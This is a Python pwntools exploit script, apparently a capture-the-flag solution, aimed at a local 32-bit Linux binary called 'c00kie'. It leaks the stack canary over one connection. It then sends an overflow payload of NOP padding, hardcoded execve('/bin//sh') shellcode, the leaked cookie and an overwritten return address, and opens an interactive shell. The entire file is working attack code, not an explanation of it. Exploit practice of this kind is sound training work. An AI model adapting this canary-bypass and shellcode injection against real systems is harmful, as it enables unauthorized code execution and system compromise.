from pwn import *

context(os='linux', arch='i386')

local=True
def conn():
	return process("./c00kie") if local else remote("127.0.0.1","9999")

leak_Addr=	0x08049250
stack=		0x8049258
cookie=		0
len_=		110

nop=		"\x90"
end=		"\xbf\x81"

#leak cookie
def pwn1():
	r=conn()
	global cookie,stack
	r.sendline("::")
	r.sendline("AAAAA")
	s=r.recv(1024)
	cookie=u32(s[-6 :-2])
	r.close()
#pwn
def pwn2():
	r1=conn()
	gdb.attach(r1,''' ''')
	global cookie
	log.info("cookie:"+hex(cookie))
	#shellcode = asm(shellcraft.i386.linux.sh())
	shellcode="\x31\xD2\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"

	tail=p32(cookie)+p32(leak_Addr)+end
	head=2*nop+p32(stack)+shellcode

	pl=head+nop*(len_-(len(tail)+len(head)))+tail

	log.info("Total byte:"+str(len(pl)))

	r1.sendline("::")
	r1.sendline(pl)
	r1.interactive()
	r1.close()

if __name__=="__main__":
	pwn1()
	pwn2()
	sys.exit(0)
